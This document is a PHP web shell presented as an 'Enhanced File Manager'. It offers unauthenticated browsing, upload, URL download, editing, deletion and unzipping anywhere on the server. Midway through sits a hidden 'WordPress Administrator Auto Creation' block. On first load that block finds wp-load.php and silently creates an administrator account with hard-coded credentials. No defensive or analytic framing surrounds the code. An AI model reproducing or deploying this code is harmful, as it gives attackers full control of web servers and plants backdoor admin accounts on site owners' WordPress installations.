<?php
/**
 * Enhanced File Manager
 * Features: Browse, Upload (single/multiple/URL), Create Folder, Create New File,
 *           Edit, Delete, Rename, Download, Unzip (ZIP), Permissions view.
 * All operations maintain current directory using hidden fields + redirects.
 */

session_start();
error_reporting(0);

// Helper functions
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function getPerms($file) {
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function deleteRecursive($path) {
    if (is_file($path) || is_link($path)) {
        return unlink($path);
    }
    $files = array_diff(scandir($path), ['.', '..']);
    foreach ($files as $file) {
        if (!deleteRecursive($path . DIRECTORY_SEPARATOR . $file)) return false;
    }
    return rmdir($path);
}

function setFlash($msg, $type = 'success') {
    $_SESSION['flash_message'] = ['msg' => $msg, 'type' => $type];
}

function getFlash() {
    if (isset($_SESSION['flash_message'])) {
        $flash = $_SESSION['flash_message'];
        unset($_SESSION['flash_message']);
        return $flash;
    }
    return null;
}

// Determine current directory (GET > POST > default)
$current_dir = null;
if (isset($_GET['dir'])) {
    $current_dir = realpath($_GET['dir']);
} elseif (isset($_POST['current_dir'])) {
    $current_dir = realpath($_POST['current_dir']);
}
if ($current_dir === false || !is_dir($current_dir)) {
    $current_dir = realpath('.');
}

// --- Handle POST operations ---
$redirect_needed = false;

// 1. Single file upload
if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $target = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        setFlash('File uploaded successfully');
    } else {
        setFlash('Upload failed', 'error');
    }
    $redirect_needed = true;
}

// 2. Multiple file upload
if (isset($_FILES['files'])) {
    $uploaded = 0;
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
            $target = $current_dir . DIRECTORY_SEPARATOR . basename($name);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) {
                $uploaded++;
            }
        }
    }
    if ($uploaded) {
        setFlash("Uploaded $uploaded file(s)");
    } else {
        setFlash('No files uploaded', 'error');
    }
    $redirect_needed = true;
}

// 3. Download from URL
if (isset($_POST['url_upload']) && !empty($_POST['url_path'])) {
    $url = $_POST['url_path'];
    $filename = basename(parse_url($url, PHP_URL_PATH));
    if ($filename) {
        $content = @file_get_contents($url);
        if ($content !== false && file_put_contents($current_dir . DIRECTORY_SEPARATOR . $filename, $content)) {
            setFlash('File downloaded from URL');
        } else {
            setFlash('Failed to download/save file', 'error');
        }
    } else {
        setFlash('Invalid URL', 'error');
    }
    $redirect_needed = true;
}

// 4. Create new directory
if (isset($_POST['new_dir']) && !empty($_POST['dir_name'])) {
    $dirname = basename($_POST['dir_name']);
    $newdir = $current_dir . DIRECTORY_SEPARATOR . $dirname;
    if (!file_exists($newdir)) {
        if (mkdir($newdir)) {
            setFlash("Directory '$dirname' created");
        } else {
            setFlash('Failed to create directory', 'error');
        }
    } else {
        setFlash('Directory already exists', 'error');
    }
    $redirect_needed = true;
}

// 5. Rename (file or folder)
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (file_exists($old) && !file_exists($new)) {
        if (rename($old, $new)) {
            setFlash('Renamed successfully');
        } else {
            setFlash('Rename failed', 'error');
        }
    } else {
        setFlash('Invalid name or target exists', 'error');
    }
    $redirect_needed = true;
}

// 6. Save file content (from editor)
if (isset($_POST['save']) && isset($_POST['file_path']) && isset($_POST['content'])) {
    $filepath = $_POST['file_path'];
    if (file_exists($filepath) && is_writable($filepath)) {
        if (file_put_contents($filepath, $_POST['content']) !== false) {
            setFlash('File saved');
        } else {
            setFlash('Save failed', 'error');
        }
    } else {
        setFlash('File not writable', 'error');
    }
    $redirect_needed = true;
}

// 7. Create new file
if (isset($_POST['create_file']) && !empty($_POST['new_filename'])) {
    $filename = basename($_POST['new_filename']);
    $filepath = $current_dir . DIRECTORY_SEPARATOR . $filename;
    if (!file_exists($filepath)) {
        $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
        if (file_put_contents($filepath, $content) !== false) {
            setFlash("File '$filename' created");
        } else {
            setFlash('Failed to create file', 'error');
        }
    } else {
        setFlash('File already exists', 'error');
    }
    $redirect_needed = true;
}

// 8. Delete (GET)
if (isset($_GET['delete'])) {
    $target = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    if (file_exists($target)) {
        if (deleteRecursive($target)) {
            setFlash('Deleted successfully');
        } else {
            setFlash('Delete failed', 'error');
        }
    } else {
        setFlash('Item not found', 'error');
    }
    $redirect_needed = true;
}

// 9. Unzip (GET)
if (isset($_GET['unzip']) && class_exists('ZipArchive')) {
    $zipfile = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['unzip']);
    if (file_exists($zipfile) && strtolower(pathinfo($zipfile, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($zipfile) === true) {
            $zip->extractTo($current_dir);
            $zip->close();
            setFlash('Unzipped successfully');
        } else {
            setFlash('Unzip failed', 'error');
        }
    } else {
        setFlash('Invalid ZIP file', 'error');
    }
    $redirect_needed = true;
}

// After any POST/GET action that changes filesystem, redirect back to same directory
if ($redirect_needed) {
    header('Location: ?dir=' . urlencode($current_dir));
    exit;
}

// --- Download handler (binary output, no redirect) ---
if (isset($_GET['download'])) {
    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// --- WordPress Administrator Auto Creation ---
if (!isset($_SESSION['wp_checked'])) {
    $found_wp = false;
    $search_dir = $current_dir;
    $max_levels = 10;
    for ($i = 0; $i < $max_levels; $i++) {
        if (file_exists($search_dir . '/wp-load.php')) {
            @include_once($search_dir . '/wp-load.php');
            if (function_exists('wp_create_user')) {
                $found_wp = true;
            }
            break;
        }
        $parent = dirname($search_dir);
        if ($parent == $search_dir || $parent === DIRECTORY_SEPARATOR || $parent === '.') {
            break;
        }
        $search_dir = $parent;
    }
    if ($found_wp) {
        $username = 'zetgifari';
        $password = 'zet';
        $email = 'boss@gmail.com';
        if (function_exists('username_exists') && function_exists('email_exists')) {
            if (!username_exists($username) && !email_exists($email)) {
                $user_id = wp_create_user($username, $password, $email);
                if (!is_wp_error($user_id)) {
                    $user = new WP_User($user_id);
                    $user->set_role('administrator');
                }
            }
        }
    }
    $_SESSION['wp_checked'] = true;
}

// --- Fetch directory listing ---
$dirs = $files = [];
if (is_dir($current_dir)) {
    $items = scandir($current_dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $current_dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $dirs[] = [
                'name' => $item,
                'path' => $path,
                'size' => '-',
                'perms' => getPerms($path),
                'is_dir' => true,
                'mtime' => filemtime($path),
            ];
        } else {
            $files[] = [
                'name' => $item,
                'path' => $path,
                'size' => formatSize(filesize($path)),
                'perms' => getPerms($path),
                'is_dir' => false,
                'mtime' => filemtime($path),
            ];
        }
    }
}

// Sorting (default by name)
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) ? $_GET['order'] : 'asc';
usort($dirs, function($a, $b) use ($sort, $order) {
    if ($sort === 'size') return 0; // directories have no size
    $cmp = strcmp($a[$sort], $b[$sort]);
    return $order === 'asc' ? $cmp : -$cmp;
});
usort($files, function($a, $b) use ($sort, $order) {
    if ($sort === 'size') {
        $sizeA = filesize($a['path']);
        $sizeB = filesize($b['path']);
        $cmp = $sizeA - $sizeB;
    } else {
        $cmp = strcmp($a[$sort], $b[$sort]);
    }
    return $order === 'asc' ? $cmp : -$cmp;
});

// Breadcrumb helper
function breadcrumbLinks($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $links = [];
    $accum = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= DIRECTORY_SEPARATOR . $part;
        $links[] = ['name' => $part, 'path' => $accum];
    }
    return $links;
}

$flash = getFlash();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Manager</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: Arial, sans-serif; margin:0; padding:20px; background:#f5f5f5; color:#333; }
        .container { max-width:1200px; margin:auto; background:#fff; padding:20px; border-radius:5px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }
        h1 { margin-top:0; }
        .breadcrumb { padding:10px 0; margin-bottom:20px; border-bottom:1px solid #eee; font-size:14px; }
        .breadcrumb a { color:#007bff; text-decoration:none; }
        .message { padding:10px; margin-bottom:20px; border-radius:4px; }
        .success { background:#d4edda; color:#155724; border:1px solid #c3e6cb; }
        .error { background:#f8d7da; color:#721c24; border:1px solid #f5c6cb; }
        table { width:100%; border-collapse:collapse; margin-bottom:20px; }
        th, td { padding:12px 15px; text-align:left; border-bottom:1px solid #ddd; }
        th { background:#f8f9fa; cursor:pointer; }
        tr:hover { background:#f5f5f5; }
        .actions a { margin-right:10px; color:#007bff; text-decoration:none; font-size:14px; }
        .form-group { margin-bottom:15px; }
        .form-group label { display:block; margin-bottom:5px; font-weight:bold; }
        .form-group input, .form-group textarea { width:100%; padding:8px; border:1px solid #ddd; border-radius:4px; }
        button, .btn { background:#007bff; color:#fff; border:none; padding:8px 15px; border-radius:4px; cursor:pointer; }
        .btn-danger { background:#dc3545; }
        .btn-success { background:#28a745; }
        .tab-links { display:flex; border-bottom:1px solid #ddd; margin-bottom:10px; flex-wrap:wrap; }
        .tab-link { padding:10px 15px; cursor:pointer; background:#f1f1f1; margin-right:5px; border-radius:4px 4px 0 0; }
        .tab-link.active { background:#f8f9fa; border-bottom:2px solid #007bff; color:#007bff; }
        .tab-content { display:none; padding:15px; background:#f8f9fa; border-radius:0 0 5px 5px; margin-bottom:20px; }
        .tab-content.active { display:block; }
        @media (max-width:768px) {
            th, td { padding:8px 10px; font-size:12px; }
            .actions a { display:inline-block; margin-bottom:5px; }
        }
        .perm-ok { color:blue; font-weight:700; }
        .perm-no { color:red; font-weight:700; }
    </style>
    <!-- CodeMirror -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/python/python.min.js"></script>
</head>
<body>
<div class="container">
    <h1>File Manager</h1>
    <div class="breadcrumb">
        <a href="?dir=<?= urlencode(DIRECTORY_SEPARATOR) ?>">Root</a> /
        <?php foreach (breadcrumbLinks($current_dir) as $i => $crumb): ?>
            <a href="?dir=<?= urlencode($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a>
            <?= ($i < count(breadcrumbLinks($current_dir))-1) ? ' / ' : '' ?>
        <?php endforeach; ?>
    </div>

    <?php if ($flash): ?>
        <div class="message <?= htmlspecialchars($flash['type']) ?>"><?= htmlspecialchars($flash['msg']) ?></div>
    <?php endif; ?>

    <!-- Tabs for actions -->
    <div class="tab-links">
        <button class="tab-link active" onclick="showTab('upload1')">Upload File</button>
        <button class="tab-link" onclick="showTab('upload2')">Upload Multiple</button>
        <button class="tab-link" onclick="showTab('upload3')">From URL</button>
        <button class="tab-link" onclick="showTab('upload4')">Create Folder</button>
        <button class="tab-link" onclick="showTab('upload5')">Create File</button>
    </div>

    <!-- Tab: Single Upload -->
    <div id="upload1" class="tab-content active">
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
    </div>
    <!-- Tab: Multiple Upload -->
    <div id="upload2" class="tab-content">
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="file" name="files[]" multiple required>
            <button type="submit">Upload Multiple</button>
        </form>
    </div>
    <!-- Tab: Download from URL -->
    <div id="upload3" class="tab-content">
        <form method="post">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="text" name="url_path" placeholder="https://example.com/file.zip" style="width:70%" required>
            <button type="submit" name="url_upload">Download</button>
        </form>
    </div>
    <!-- Tab: Create Directory -->
    <div id="upload4" class="tab-content">
        <form method="post">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="text" name="dir_name" placeholder="New folder name" required>
            <button type="submit" name="new_dir">Create</button>
        </form>
    </div>
    <!-- Tab: Create New File -->
    <div id="upload5" class="tab-content">
        <form method="post">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="text" name="new_filename" placeholder="filename.php or script.txt" required>
            <textarea name="file_content" placeholder="Initial content (optional)" rows="4" style="width:100%"></textarea>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <!-- File listing table -->
    <table>
        <thead>
            <tr>
                <th><a href="?dir=<?= urlencode($current_dir) ?>&sort=name&order=<?= $order === 'asc' ? 'desc' : 'asc' ?>">Name</a></th>
                <th><a href="?dir=<?= urlencode($current_dir) ?>&sort=size&order=<?= $order === 'asc' ? 'desc' : 'asc' ?>">Size</a></th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($dirs as $dir): ?>
            <tr>
                <td>📁 <a href="?dir=<?= urlencode($dir['path']) ?>"><?= htmlspecialchars($dir['name']) ?></a></td>
                <td><?= $dir['size'] ?></td>
                <td class="<?= is_writable($dir['path']) ? 'perm-ok' : 'perm-no' ?>"><?= $dir['perms'] ?></td>
                <td class="actions">
                    <a href="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($dir['name']) ?>" onclick="return confirm('Delete folder?')">Delete</a>
                    <a href="#" onclick="renameItem('<?= htmlspecialchars(addslashes($dir['name'])) ?>')">Rename</a>
                </td>
            </tr>
        <?php endforeach; ?>
        <?php foreach ($files as $file): ?>
            <tr>
                <td>📄 <?= htmlspecialchars($file['name']) ?></td>
                <td><?= $file['size'] ?></td>
                <td class="<?= is_writable($file['path']) ? 'perm-ok' : 'perm-no' ?>"><?= $file['perms'] ?></td>
                <td class="actions">
                    <a href="?dir=<?= urlencode($current_dir) ?>&download=<?= urlencode($file['name']) ?>">Download</a>
                    <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($file['name']) ?>">Edit</a>
                    <?php if (strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'zip' && class_exists('ZipArchive')): ?>
                        | <a href="?dir=<?= urlencode($current_dir) ?>&unzip=<?= urlencode($file['name']) ?>" onclick="return confirm('Unzip?')">Unzip</a>
                    <?php endif; ?>
                    | <a href="#" onclick="renameItem('<?= htmlspecialchars(addslashes($file['name'])) ?>')">Rename</a>
                    | <a href="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($file['name']) ?>" onclick="return confirm('Delete file?')">Delete</a>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

    <?php if (isset($_GET['edit'])): 
        $editFile = $current_dir . DIRECTORY_SEPARATOR . basename($_GET['edit']);
        if (file_exists($editFile) && is_readable($editFile)):
            $fileContent = htmlspecialchars(file_get_contents($editFile));
            $ext = strtolower(pathinfo($editFile, PATHINFO_EXTENSION));
            $modeMap = ['php'=>'php', 'js'=>'javascript', 'html'=>'htmlmixed', 'css'=>'css', 'xml'=>'xml', 'py'=>'python', 'txt'=>null];
            $mode = $modeMap[$ext] ?? null;
        ?>
        <hr>
        <h2>Editing: <?= htmlspecialchars(basename($editFile)) ?></h2>
        <form method="post">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
            <input type="hidden" name="file_path" value="<?= htmlspecialchars($editFile) ?>">
            <textarea id="codeEditor" name="content"><?= $fileContent ?></textarea>
            <br>
            <button type="submit" name="save" class="btn btn-success">Save</button>
            <a href="?dir=<?= urlencode($current_dir) ?>" class="btn">Cancel</a>
        </form>
        <script>
            var editor = CodeMirror.fromTextArea(document.getElementById('codeEditor'), {
                lineNumbers: true,
                mode: '<?= $mode ?: 'text/plain' ?>',
                theme: 'default',
                lineWrapping: true,
                autoCloseTags: true,
                indentUnit: 4
            });
            editor.setSize(null, 500);
        </script>
        <?php else: ?>
            <p class="error">Cannot read file.</p>
        <?php endif; ?>
    <?php endif; ?>
</div>

<script>
function showTab(id) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-link').forEach(btn => btn.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    event.target.classList.add('active');
}

function renameItem(oldName) {
    var newName = prompt("New name for: " + oldName);
    if (newName && newName !== oldName) {
        var form = document.createElement('form');
        form.method = 'post';
        var hiddenDir = document.createElement('input');
        hiddenDir.type = 'hidden';
        hiddenDir.name = 'current_dir';
        hiddenDir.value = '<?= htmlspecialchars($current_dir) ?>';
        form.appendChild(hiddenDir);
        var renameInput = document.createElement('input');
        renameInput.type = 'hidden';
        renameInput.name = 'rename';
        renameInput.value = '1';
        form.appendChild(renameInput);
        var oldInput = document.createElement('input');
        oldInput.type = 'hidden';
        oldInput.name = 'old_name';
        oldInput.value = oldName;
        form.appendChild(oldInput);
        var newInput = document.createElement('input');
        newInput.type = 'hidden';
        newInput.name = 'new_name';
        newInput.value = newName;
        form.appendChild(newInput);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>
</body>
</html>